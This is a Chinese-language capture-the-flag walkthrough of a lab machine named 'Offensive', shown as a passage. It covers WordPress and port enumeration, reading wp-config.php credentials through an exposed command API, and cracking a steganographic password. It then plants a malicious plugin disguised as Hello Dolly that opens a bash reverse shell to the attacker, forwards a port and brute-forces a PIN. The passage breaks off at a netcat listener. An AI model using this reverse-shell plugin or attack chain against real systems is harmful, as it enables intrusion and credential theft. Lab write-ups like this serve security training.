+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Fri Jan  <span class="token number">3</span> <span class="token number">12</span>:58:26 <span class="token number">2025</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">109676</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">11</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">24.318</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">44.179</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">461.465</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:02:29</code></pre>
+<p>没什么用得到的</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  wpscan <span class="token parameter variable">--url</span> http://offensive.thl/ <span class="token parameter variable">-e</span> u                                                         <span class="token punctuation">[</span><span class="token number">13</span>:06:24<span class="token punctuation">]</span>
+_______________________________________________________________
+         __          _______   _____
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
+          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
+           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://offensive.thl/ [192.168.31.66]
+[+] Started: Fri Jan  3 13:06:30 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.62 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+Fingerprinting the version - Time: 00:00:03 &lt;============================================> (702 / 702) 100.00% Time: 00:00:03
+[i] The WordPress version could not be detected.
+
+[+] WordPress theme in use: gentlemens-club
+ | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
+ | Latest Version: 1.0.0 (up to date)
+ | Last Updated: 2024-09-25T00:00:00.000Z
+ | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
+ | [!] Directory listing is enabled
+ | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
+ | Style Name: Gentlemen'</span>s Club
+ <span class="token operator">|</span> Description: Theme with a simple design, extremely linear and clean. A space reserved <span class="token keyword">for</span> the private club. The p<span class="token punctuation">..</span>.
+ <span class="token operator">|</span> Author: masino1967
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Urls In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Version: <span class="token number">1.0</span>.0 <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Found By: Style <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: <span class="token string">'Version: 1.0.0'</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Users <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
+ Brute Forcing Author IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">10</span> / <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> administrator
+ <span class="token operator">|</span> Found By: Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Confirmed By:
+ <span class="token operator">|</span>  Wp Json Api <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>   - http://offensive.thl/index.php/wp-json/wp/v2/users/?per_page<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token assign-left variable">page</span><span class="token operator">=</span><span class="token number">1</span>
+ <span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span></code></pre>
+<p> 枚举用户发现有个administrator用户，然而当我想尝试登录的时候，访问<a target="_blank" rel="noopener" href="http://offensive.thl/wp-login.php%E7%9A%84%E6%97%B6%E5%80%99%E6%98%BE%E7%A4%BA404">http://offensive.thl/wp-login.php的时候显示404</a><br> <img src="https://ooo.0x0.ooo/2025/01/03/OE4dWs.png" alt="OE4dWs.png" loading="lazy"><br> 后来发现是<code>wps-hide-login</code>这个插件搞的鬼<br> <img src="https://ooo.0x0.ooo/2025/01/03/OE4sgK.png" alt="OE4sgK.png" loading="lazy"><br> 登录界面应该被重定向到了404，暂时卡在这了，看看另一个端口:8080</p>
+<h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><p> <img src="https://ooo.0x0.ooo/2025/01/03/OE4VVa.png" alt="OE4VVa.png" loading="lazy"><br>看起来是响应包的头啊，fuzz一下参数，扫一下参数</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.31.66:8080/  <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.31.66:8080/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              php,bak,zip,html,txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/help                 <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">203</span><span class="token punctuation">]</span>
+/cat                  <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">31</span><span class="token punctuation">]</span>
+/Help                 <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">203</span><span class="token punctuation">]</span>
+/ls                   <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">176</span><span class="token punctuation">]</span>
+/rm                   <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">45</span><span class="token punctuation">]</span>
+/Cat                  <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">31</span><span class="token punctuation">]</span>
+/RM                   <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">45</span><span class="token punctuation">]</span>
+Progress: <span class="token number">94867</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">7.17</span>%<span class="token punctuation">)</span>^C
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
+Progress: <span class="token number">97199</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">7.34</span>%<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Finished
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
+<p>是个接口，可以执行命令<br><img src="https://ooo.0x0.ooo/2025/01/03/OE4foS.png" alt="OE4foS.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2025/01/03/OE4lrN.png" alt="OE4lrN.png" loading="lazy"><br>help给了使用方法,读一下config看一下密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">curl</span> <span class="token string">'http://192.168.31.66:8080/cat?path=wordpress/wp-config.php'</span>                               <span class="token punctuation">[</span><span class="token number">13</span>:17:08<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>?php
+/**
+ * The base configuration <span class="token keyword">for</span> WordPress
+ *
+ * The wp-config.php creation script uses this <span class="token function">file</span> during the installation.
+ * You don<span class="token string">'t have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( '</span>DB_NAME<span class="token string">', '</span>wordpress<span class="token string">' );
+
+/** Database username */
+define( '</span>DB_USER<span class="token string">', '</span>wp_user<span class="token string">' );
+
+/** Database password */
+define( '</span>DB_PASSWORD<span class="token string">', '</span>wpManoloPass<span class="token string">' );
+
+/** Database hostname */
+define( '</span>DB_HOST<span class="token string">', '</span>localhost<span class="token string">' );
+
+/** Database charset to use in creating database tables. */
+define( '</span>DB_CHARSET<span class="token string">', '</span>utf8<span class="token string">' );
+
+/** The database collate type. Don'</span>t change this <span class="token keyword">if</span> <span class="token keyword">in</span> doubt. */
+define<span class="token punctuation">(</span> <span class="token string">'DB_COLLATE'</span>, <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/**<span class="token comment">#@+</span>
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases<span class="token operator">!</span> You can generate these using
+ * the <span class="token punctuation">&#123;</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="token punctuation">&#125;</span>.
+ *
+ * You can change these at any point <span class="token keyword">in</span> <span class="token function">time</span> to invalidate all existing cookies.
+ * This will force all <span class="token function">users</span> to have to log <span class="token keyword">in</span> again.
+ *
+ * @since <span class="token number">2.6</span>.0
+ */
+define<span class="token punctuation">(</span> <span class="token string">'AUTH_KEY'</span>,         <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_KEY'</span>,  <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_KEY'</span>,    <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'NONCE_KEY'</span>,        <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'AUTH_SALT'</span>,        <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_SALT'</span>, <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_SALT'</span>,   <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+define<span class="token punctuation">(</span> <span class="token string">'NONCE_SALT'</span>,       <span class="token string">'put your unique phrase here'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/**<span class="token comment">#@-*/</span>
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations <span class="token keyword">in</span> one database <span class="token keyword">if</span> you give each
+ * a unique prefix. Only numbers, letters, and underscores please<span class="token operator">!</span>
+ *
+ * At the installation time, database tables are created with the specified prefix.
+ * Changing this value after WordPress is installed will <span class="token function">make</span> your site think
+ * it has not been installed.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/<span class="token comment">#table-prefix</span>
+ */
+<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string">'wp_'</span><span class="token punctuation">;</span>
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to <span class="token boolean">true</span> to <span class="token builtin class-name">enable</span> the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * <span class="token keyword">in</span> their development environments.
+ *
+ * For information on other constants that can be used <span class="token keyword">for</span> debugging,
+ * visit the documentation.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+ */
+define<span class="token punctuation">(</span> <span class="token string">'WP_DEBUG'</span>, <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/* Add any custom values between this line and the <span class="token string">"stop editing"</span> line. */
+
+
+
+/* That<span class="token string">'s all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( '</span>ABSPATH<span class="token string">' ) ) &#123;
+        define( '</span>ABSPATH<span class="token string">', __DIR__ . '</span>/<span class="token string">' );
+&#125;
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . '</span>wp-settings.php'<span class="token punctuation">;</span></code></pre>
+<p><code>wp_user:wpManoloPass</code><br>尝试删除wps-hide-login这个插件<br><img src="https://ooo.0x0.ooo/2025/01/03/OE4j3L.png" alt="OE4j3L.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2025/01/03/OE46ii.png" alt="OE46ii.png" loading="lazy"><br>这下能成功访问登录界面了,登录拿到的账号密码，然后发现登录不上去，因为这是数据库的密码<br>用户名是administrator，密码不知道，卡了一会发现密码被隐写到一个图片里了<br><img src="https://ooo.0x0.ooo/2025/01/03/OE48tX.png" alt="OE48tX.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">wget</span> http://offensive.thl/images/wp-login.jpg                                                <span class="token punctuation">[</span><span class="token number">13</span>:25:09<span class="token punctuation">]</span>
+--2025-01-03 <span class="token number">13</span>:25:11--  http://offensive.thl/images/wp-login.jpg
+Resolving offensive.thl <span class="token punctuation">(</span>offensive.thl<span class="token punctuation">)</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.31.66
+Connecting to offensive.thl <span class="token punctuation">(</span>offensive.thl<span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">192.168</span>.31.66<span class="token operator">|</span>:80<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">648072</span> <span class="token punctuation">(</span>633K<span class="token punctuation">)</span> <span class="token punctuation">[</span>image/jpeg<span class="token punctuation">]</span>
+Saving to: <span class="token string">'wp-login.jpg'</span>
+
+wp-login.jpg                    <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span> <span class="token number">632</span>.88K  --.-KB/s    <span class="token keyword">in</span> <span class="token number">0</span>.002s  
+
+<span class="token number">2025</span>-01-03 <span class="token number">13</span>:25:11 <span class="token punctuation">(</span><span class="token number">257</span> MB/s<span class="token punctuation">)</span> - <span class="token string">'wp-login.jpg'</span> saved <span class="token punctuation">[</span><span class="token number">648072</span>/648072<span class="token punctuation">]</span>
+
+root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  stegseek wp-login.jpg                                                                        <span class="token punctuation">[</span><span class="token number">13</span>:25:11<span class="token punctuation">]</span>
+StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found passphrase: <span class="token string">"bestfriend"</span>
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Original filename: <span class="token string">"wp-login.txt"</span><span class="token builtin class-name">.</span>
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Extracting to <span class="token string">"wp-login.jpg.out"</span><span class="token builtin class-name">.</span>
+
+root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> wp-login.jpg.out                                                                         <span class="token punctuation">[</span><span class="token number">13</span>:25:20<span class="token punctuation">]</span>
+uFQ07kmjImx$<span class="token punctuation">)</span>x9HHH3J3Sa5</code></pre>
+<p>还是有点绕的。<br>进入后台就好操作了，上传个木马插件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+/**
+ * @package Hello_Dolly
+ * @version <span class="token number">1.7</span>.2
+ */
+/*
+Plugin Name: <span class="token number">1213</span>
+Plugin URI: http://wordpress.org/plugins/hello-dolly/
+Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up <span class="token keyword">in</span> two words sung <span class="token function">most</span> famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <span class="token operator">&lt;</span>cite<span class="token operator">></span>Hello, Dolly<span class="token operator">&lt;</span>/cite<span class="token operator">></span> <span class="token keyword">in</span> the upper right of your admin <span class="token function">screen</span> on every page.
+Author: Matt Mullenweg
+Version: <span class="token number">1.0</span>
+Author URI: http://ma.tt/
+*/
+system<span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.31.34/4567 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span></code></pre>
+<p>然后压缩成zip上传激活就能弹回shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheHackersLabs-Offensive:/home$ <span class="token function">ls</span>
+maria</code></pre>
+<p>只有一个用户maria<br>想从数据库看看有没有用户密码，发现没有</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">MariaDB <span class="token punctuation">[</span>wordpress<span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> * from wp_users<span class="token punctuation">;</span>
++----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
+<span class="token operator">|</span> ID <span class="token operator">|</span> user_login    <span class="token operator">|</span> user_pass                          <span class="token operator">|</span> user_nicename <span class="token operator">|</span> user_email       <span class="token operator">|</span> user_url              <span class="token operator">|</span> user_registered     <span class="token operator">|</span> user_activation_key <span class="token operator">|</span> user_status <span class="token operator">|</span> display_name  <span class="token operator">|</span>
++----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> administrator <span class="token operator">|</span> <span class="token variable">$P</span><span class="token variable">$BPzDdGMVlbK3gPYUUVtbvf0roz4rxX</span>/ <span class="token operator">|</span> administrator <span class="token operator">|</span> rodgar@gmail.com <span class="token operator">|</span> http://172.16.241.211 <span class="token operator">|</span> <span class="token number">2024</span>-12-20 <span class="token number">12</span>:18:14 <span class="token operator">|</span>                     <span class="token operator">|</span>           <span class="token number">0</span> <span class="token operator">|</span> administrator <span class="token operator">|</span>
++----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.000</span> sec<span class="token punctuation">)</span></code></pre>
+<p>想起来还有一个端口5000，研究一下这个端口</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheHackersLabs-Offensive:/var/www/wordpress$ ss <span class="token parameter variable">-tulnp</span>
+Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
+udp     UNCONN   <span class="token number">0</span>        <span class="token number">0</span>                <span class="token number">0.0</span>.0.0:68            <span class="token number">0.0</span>.0.0:*                                                                                      
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">80</span>             <span class="token number">127.0</span>.0.1:3306          <span class="token number">0.0</span>.0.0:*                                                                                      
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">511</span>              <span class="token number">0.0</span>.0.0:8080          <span class="token number">0.0</span>.0.0:*       users:<span class="token variable"><span class="token punctuation">((</span>"node"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">627</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">))</span></span>                                                 
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">4096</span>             <span class="token number">0.0</span>.0.0:5000          <span class="token number">0.0</span>.0.0:*                                                                                      
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">128</span>              <span class="token number">0.0</span>.0.0:22            <span class="token number">0.0</span>.0.0:*                                                                                      
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">128</span>                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22               <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                                                                      
+tcp     LISTEN   <span class="token number">0</span>        <span class="token number">511</span>                    *:80                  *:* </code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheHackersLabs-Offensive:/var/www/wordpress$ <span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">5000</span>
+maria        <span class="token number">628</span>  <span class="token number">0.0</span>  <span class="token number">1.7</span> <span class="token number">266096</span> <span class="token number">35128</span> ?        Ss   <span class="token number">22</span>:27   <span class="token number">0</span>:00 /usr/bin/php <span class="token parameter variable">-S</span> <span class="token number">0.0</span>.0.0:5000</code></pre>
+<p>是maria用户开的一个php服务，端口转发出去</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">socat TCP4-LISTEN:6677,fork TCP4:127.0.0.1:5000</code></pre>
+<p><img src="https://ooo.0x0.ooo/2025/01/03/OE48tX.png" alt="OE48tX.png" loading="lazy"><br>爆破一下 4位数的pin码<br><img src="https://ooo.0x0.ooo/2025/01/03/OE43gj.png" alt="OE43gj.png" loading="lazy"><br>爆破出来是3333<br><img src="https://ooo.0x0.ooo/2025/01/03/OE4CVp.png" alt="OE4CVp.png" loading="lazy"><br>可以执行命令，直接弹回一个maria的shell<br><img src="https://ooo.0x0.ooo/2025/01/03/OEDOrY.png" alt="OEDOrY.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                                                                                   <span class="token punctuation">[</span><span class="token number">13</span>:53:17<span class="token punctuation">]</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
